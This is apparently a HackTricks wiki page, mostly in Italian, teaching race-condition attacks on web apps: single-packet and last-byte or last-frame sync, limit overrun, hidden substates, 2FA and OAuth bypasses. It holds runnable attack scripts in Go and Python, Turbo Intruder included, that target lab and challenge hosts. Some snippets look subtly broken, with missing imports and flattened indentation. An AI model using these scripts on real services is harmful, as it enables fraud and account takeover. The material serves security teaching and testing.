# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Per ottenere una comprensione approfondita di questa tecnica consulta il report originale su [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Il principale ostacolo nello sfruttare race condition è assicurarsi che più richieste vengano processate contemporaneamente, con una differenza nei tempi di elaborazione molto piccola — idealmente, meno di 1ms.

Qui trovi alcune tecniche per sincronizzare le richieste:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Supporta l'invio di due richieste su una singola connessione TCP, riducendo l'impatto del network jitter. Tuttavia, a causa di variazioni lato server, due richieste potrebbero non essere sufficienti per un exploit di race condition consistente.
- **HTTP/1.1 'Last-Byte Sync'**: Permette di pre-inviare la maggior parte delle parti di 20-30 richieste, trattenendo un piccolo frammento, che viene poi inviato insieme, ottenendo l'arrivo simultaneo al server.

**Preparazione per Last-Byte Sync** include:

1. Inviare headers e body meno l'ultimo byte senza chiudere lo stream.
2. Mettere in pausa per 100ms dopo l'invio iniziale.
3. Disabilitare TCP_NODELAY per sfruttare l'algoritmo di Nagle e raggruppare i frame finali.
4. Eseguire ping per riscaldare la connessione.

L'invio successivo dei frame trattenuti dovrebbe risultare nel loro arrivo in un unico pacchetto, verificabile con Wireshark. Questo metodo non si applica ai file statici, che tipicamente non sono coinvolti negli attacchi RC.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 viaggia su QUIC (UDP). Non esiste coalescenza TCP né Nagle su cui fare affidamento, quindi il classico last‑byte sync non funziona con client pronti all'uso. Invece, è necessario coalescere deliberatamente più frame DATA finali di stream QUIC (FIN) nello stesso datagram UDP in modo che il server processi tutte le richieste target nello stesso tick di scheduling.
- **How to do it**: Usa una libreria costruita ad hoc che esponga il controllo dei frame QUIC. Per esempio, H3SpaceX manipola quic-go per implementare HTTP/3 last‑frame synchronization sia per richieste con body sia per richieste in stile GET senza body.
- Requests‑with‑body: inviare HEADERS + DATA meno l'ultimo byte per N stream, poi inviare insieme l'ultimo byte di ciascuno stream.
- GET‑style: costruire frame DATA finti (o un piccolo body con Content‑Length) e chiudere tutti gli stream in un unico datagram.
- **Practical limits**:
- La concorrenza è limitata dal parametro di trasporto QUIC max_streams del peer (simile a SETTINGS_MAX_CONCURRENT_STREAMS di HTTP/2). Se è basso, apri più connessioni H3 e distribuisci la race tra di esse.
- La dimensione del datagram UDP e la path MTU limitano quanti frame finali di stream puoi coalescere. La libreria gestisce lo split in più datagram se necessario, ma un flush in un singolo datagram è il più affidabile.
- **Practice**: Sono disponibili lab pubblici H2/H3 per race e exploit di esempio che accompagnano H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Adattamento all'architettura del server

Comprendere l'architettura del bersaglio è cruciale. I Front-end servers potrebbero instradare le richieste in modo differente, influenzando il timing. Un server-side connection warming preemptivo, tramite richieste inconsequenziali, potrebbe normalizzare il timing delle richieste.

#### Gestione dei blocchi basati sulla sessione

Framework come PHP's session handler serializzano le richieste per sessione, potenzialmente oscurando vulnerabilità. Utilizzare diversi session tokens per ogni richiesta può aggirare questo problema.

#### Superare limiti di rate o di risorse

Se il connection warming non è efficace, provocare intenzionalmente ritardi dovuti ai limiti di rate o risorse dei web servers tramite un flood di richieste dummy potrebbe facilitare il single-packet attack inducendo un server-side delay favorevole a race conditions.

## Esempi di attacco

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Puoi inviare la richiesta a **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), puoi cambiare nella richiesta il valore che vuoi brute force per **`%s`** come in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` e poi selezionare la **`examples/race-single-packer-attack.py`** dal menu a tendina:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Se intendi **inviare valori diversi**, puoi modificare il codice con questo che usa una wordlist dalla clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Se il sito non supporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` invece di `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Nel caso tu debba inviare una richiesta a un endpoint e poi più richieste ad altri endpoint per innescare la RCE, puoi modificare lo script `race-single-packet-attack.py` con qualcosa del genere:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- È disponibile anche in **Repeater** tramite la nuova opzione '**Send group in parallel**' in Burp Suite.
- Per **limit-overrun** puoi semplicemente aggiungere la **stessa request 50 volte** nel gruppo.
- Per **connection warming**, potresti **aggiungere** all'**inizio** del **group** alcune **requests** verso qualche parte non statica del web server.
- Per **delaying** il processo **tra** l'elaborazione di **una request e l'altra** in una sequenza a 2 sottostati, potresti **aggiungere requests extra** fra le due requests.
- Per una RC **multi-endpoint** potresti iniziare inviando la **request** che **porta allo stato nascosto** e poi **50 requests** subito dopo che **sfruttano lo stato nascosto**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Lo scopo di questo script è cambiare l'email di un utente mentre la verifica continuamente fino a quando il token di verifica della nuova email non arriva alla vecchia email (questo perché nel codice si osservava una RC in cui era possibile modificare un'email ma far inviare la verifica alla vecchia, perché la variabile che indica l'email era già popolata con la prima).\
Quando nella posta ricevuta viene trovata la parola "objetivo" sappiamo di aver ricevuto il token di verifica della email cambiata e terminiamo l'attacco.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: note su engine e gating

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
- Diagnostics: i timestamp negativi in Turbo Intruder indicano che il server ha risposto prima che la richiesta fosse completamente inviata, dimostrando sovrapposizione. Questo è previsto nelle vere race.
- Connection warming: invia un ping o qualche richiesta innocua all'inizio per stabilizzare i tempi; opzionalmente disabilita `TCP_NODELAY` per favorire il batching dei frame finali.


### Migliorare il Single Packet Attack

Nella ricerca originale viene spiegato che questo attack ha un limite di 1.500 byte. Tuttavia, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), è stato spiegato come sia possibile estendere la limitazione di 1.500 byte del single packet attack fino al limite di finestra di **65.535 B di TCP usando la frammentazione a livello IP** (splittando un singolo packet in più pacchetti IP) e inviandoli in ordine diverso, impedendo il riassemblaggio del packet fino a quando tutti i frammenti non raggiungono il server. Questa tecnica ha permesso al ricercatore di inviare 10.000 richieste in circa 166ms.

Nota che, sebbene questo miglioramento renda l'attack più affidabile in RC che richiedono centinaia/migliaia di pacchetti che arrivino contemporaneamente, potrebbe anche avere alcune limitazioni software. Alcuni server HTTP popolari come Apache, Nginx e Go hanno un impostazione rigorosa `SETTINGS_MAX_CONCURRENT_STREAMS` a 100, 128 e 250. Tuttavia, altri come NodeJS e nghttp2 la hanno illimitata.\
Questo significa fondamentalmente che Apache considererà solo 100 connessioni HTTP da una singola connessione TCP (limitando questo RC attack). Per HTTP/3, il limite analogo è il parametro di trasporto max_streams di QUIC – se è basso, distribuisci la tua race su più connessioni QUIC.

Puoi trovare alcuni esempi che utilizzano questa tecnica nel repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Prima della ricerca menzionata sopra, questi erano alcuni payload usati che cercavano semplicemente di inviare i pacchetti il più velocemente possibile per causare una RC.

- **Repeater:** Vedi gli esempi della sezione precedente.
- **Intruder**: Invia la **request** a **Intruder**, imposta il **number of threads** a **30** nel **Options menu**, seleziona come payload **Null payloads** e genera **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Questo è il tipo più elementare di race condition in cui **vulnerabilities** **appaiono** in punti che **limitano il numero di volte in cui puoi eseguire un'azione**. Come usare lo stesso codice sconto in uno store web più volte. Un esempio molto semplice si trova in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o in [**this bug**](https://hackerone.com/reports/759247)**.**

There are many variations of this kind of attack, including:

- Riscattare una gift card più volte
- Valutare un prodotto più volte
- Prelevare o trasferire denaro oltre il saldo del conto
- Riutilizzare la soluzione di un singolo CAPTCHA
- Bypassare un rate limit anti-brute-force

### **Hidden substates**

Sfruttare race condition complesse spesso comporta approfittare di brevi opportunità per interagire con sottostati nascosti o **sottostati della macchina non previsti**. Ecco come procedere:

1. **Identificare Potenziali Sottostati Nascosti**
- Inizia individuando endpoints che modificano o interagiscono con dati critici, come profili utente o processi di reimpostazione della password. Concentrati su:
- **Storage**: Preferisci endpoints che manipolano dati persistenti lato server rispetto a quelli che gestiscono i dati lato client.
- **Action**: Cerca operazioni che alterano dati esistenti, più propense a creare condizioni sfruttabili rispetto a quelle che aggiungono nuovi dati.
- **Keying**: Gli attacchi riusciti di solito coinvolgono operazioni indicizzate sullo stesso identificatore, es. username o reset token.
2. **Effettua test iniziali**
- Testa gli endpoints identificati con attacchi di race condition, osservando eventuali deviazioni dai risultati attesi. Risposte inattese o cambiamenti nel comportamento dell'applicazione possono indicare una vulnerabilità.
3. **Dimostrare la Vulnerabilità**
- Riduci l'attacco al numero minimo di richieste necessario per sfruttare la vulnerabilità, spesso soltanto due. Questo passaggio potrebbe richiedere tentativi ripetuti o automazione a causa della sincronizzazione precisa richiesta.

### Attacchi sensibili al tempo

La precisione nel tempo delle richieste può rivelare vulnerabilità, specialmente quando metodi prevedibili come i timestamp sono usati per i token di sicurezza. Ad esempio, generare token di reset della password basati su timestamp potrebbe permettere token identici per richieste simultanee.

**Per sfruttare:**

- Usa tempistiche precise, come un attacco a singolo pacchetto, per effettuare richieste di password reset concorrenti. Token identici indicano una vulnerabilità.

**Esempio:**

- Richiedi due password reset token nello stesso istante e confrontali. Token corrispondenti suggeriscono un difetto nella generazione dei token.

**Dai un'occhiata a** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **per provarlo.**

## Casi di studio sui sottostati nascosti

### Pagare & aggiungere un Item

Dai un'occhiata a [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) per vedere come **pagare** in un negozio e **aggiungere un articolo extra** che **non dovrai pagare**.

### Confermare altre email

L'idea è **verificare un indirizzo email e cambiarlo con uno diverso contemporaneamente** per capire se la piattaforma verifica il nuovo indirizzo.

### Cambiare email in 2 indirizzi (basato sui cookie)

Secondo [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab era vulnerabile a un takeover in questo modo perché poteva **inviare** il **token di verifica email di un indirizzo all'altro indirizzo**.

**Dai un'occhiata a** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **per provarlo.**

### Stati nascosti del database / Bypass della conferma

Se vengono usate **2 diverse scritture** per **aggiungere** **informazioni** all'interno di un **database**, esiste un piccolo intervallo di tempo in cui **solo il primo dato è stato scritto** nel database. Per esempio, quando si crea un utente lo **username** e la **password** potrebbero essere **scritte** e **poi il token** per confermare l'account appena creato viene scritto. Ciò significa che per un breve lasso di tempo il **token per confermare un account è nullo**.

Pertanto **registrare un account e inviare diverse richieste con un token vuoto** (`token=` or `token[]=` or any other variation) per confermare immediatamente l'account potrebbe consentire di c**onfermare un account** dove non controlli l'email.

**Dai un'occhiata a** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **per provarlo.**

### Bypass 2FA

Il seguente pseudo-codice è vulnerabile a race condition perché per un brevissimo periodo la **2FA non viene applicata** mentre la sessione viene creata:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Questi servizi ti permettono di creare un'applicazione e autenticare gli utenti che il provider ha registrato. Per farlo, il **client** dovrà **permettere alla tua applicazione** di accedere a una parte dei loro dati all'interno del **OAUth provider**.\
Quindi, fino a qui è solo un login comune con google/linkedin/github... dove ti viene mostrata una pagina che dice: "_L'applicazione <InsertCoolName> vuole accedere alle tue informazioni, vuoi permetterlo?_" 

#### Race Condition in `authorization_code`

Il **problema** si presenta quando **lo accetti** e viene inviato automaticamente un **`authorization_code`** all'applicazione malevola. Questa **applicazione sfrutta una Race Condition nel provider OAUth per generare più AT/RT** (_Authentication Token/Refresh Token_) dallo **`authorization_code`** per il tuo account. Fondamentalmente, abuserà del fatto che hai accettato che l'applicazione acceda ai tuoi dati per **creare diversi account**. Poi, se **smetti di permettere** all'applicazione di accedere ai tuoi dati, una coppia di AT/RT sarà cancellata, ma le altre resteranno ancora valide.

#### Race Condition in `Refresh Token`

Una volta ottenuto un RT valido puoi provare ad **abusarne per generare diversi AT/RT** e **anche se l'utente revoca i permessi** per l'applicazione malevola di accedere ai suoi dati, **diversi RT rimarranno comunque validi.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) puoi trovare una PoC in Java per inviare messaggi websocket in **parallelo** per sfruttare **Race Conditions anche nei Web Sockets**.
- Con Burp’s WebSocket Turbo Intruder puoi usare il motore **THREADED** per creare più connessioni WS e inviare payload in parallelo. Parti dall'esempio ufficiale e ottimizza `config()` (thread count) per la concorrenza; questo è spesso più affidabile rispetto all'inviare batch su una singola connessione quando si gareggia sullo stato lato server attraverso gli handler WS. Vedi [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
